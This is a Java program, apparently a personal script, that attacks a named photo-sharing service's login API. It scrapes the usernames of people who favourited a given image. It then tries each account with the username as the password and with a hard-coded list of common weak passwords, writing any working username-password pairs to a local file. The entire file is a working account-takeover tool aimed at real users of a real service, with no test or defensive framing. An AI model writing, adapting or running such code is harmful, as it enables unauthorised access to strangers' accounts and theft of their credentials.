package net.lqm.main;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import net.lqm.util.HttpUtils;
import net.lqm.util.ReadFileUtil;

public class PasswordMain {

	public static void main(String[] args) {
		//排除项
//		List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\other_psw.txt", false);
		
		List<String> myList = new ArrayList<String>();
		List<String> pswList = getSimplePasswords();
		for (String userId : getFavoriteUsers("61536")) {
			myList.add(getUserName(userId));
		}
		for (String user : myList) {
			for (String s : pswList) {
//				if(l1.contains(user+"-"+s)) {
//					break;
//				}
				
				String ru = loginWeApp(user, user);
				if(ru!=null){
					System.out.println(ru);
					break;
				}
				
				String res = loginWeApp(user, s);
				if(res!=null){
					System.out.println(res);
					break;
				}
			}
		}
	}

	public static List<String> getSimplePasswords() {
		String s = "000000、111111、11111111、112233、123123、123321、123456、12345678、654321、"
				+ "666666、888888、88888888、abcdef、abcabc、a1b2c3、aaa111、123qwe、qq123456、qqq123456"
				+ "qwerty、qweasd、admin、password、p@ssword、passwd、iloveyou、5201314";
		String[] ss = s.split("、");
		List<String> list = new ArrayList<String>();
		for (String str : ss)
			list.add(str);

		return list;
	}

	private static String loginWeApp(String user, String password) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/user/login";
		String param = "{\"parameters\":{\"version\":\"1.3.0\",\"username\":\"" + user + "\",\"password\":\"" + password
				+ "\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);

		try {
			map.get("content").get("token").toString();
			ReadFileUtil.writeTxtFile("D:\\Documents\\we\\del\\del_kitty.txt", user + "-" + password);
			return user;
		} catch (Exception e) {
//			System.out.println(res);
			// System.out.println("password is wrong： "+user);
		}
		return null;
	}

	private static List<String> getFavoriteUsers(String imageId) {
		List<String> returnList = new ArrayList<String>();
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoriteUsers";
		String param = "{\"parameters\":{\"is_all\":\"1\",\"image_id\":\"" + imageId + "\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);
		String userListStr = map.get("content").get("favorite_users") + "";
		JSONArray users = (JSONArray) JSON.parse(userListStr);
		for (Object user : users) {
			JSONObject jo = (JSONObject) JSONObject.toJSON(user);
			returnList.add(jo.get("user_id").toString());
		}
		return returnList;
	}

	private static String getUserName(String userId) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/otherPublishes";
		String param = "{\"parameters\":{\"user_id\":\"" + userId + "\"}}";

		String res = HttpUtils.sendPost(url, param);
		JSONObject jo = JSON.parseObject(res);
		JSONObject content = (JSONObject) jo.get("content");
		JSONObject userinfo = (JSONObject) content.get("user_info");

		return userinfo.get("username") + "";
	}
}
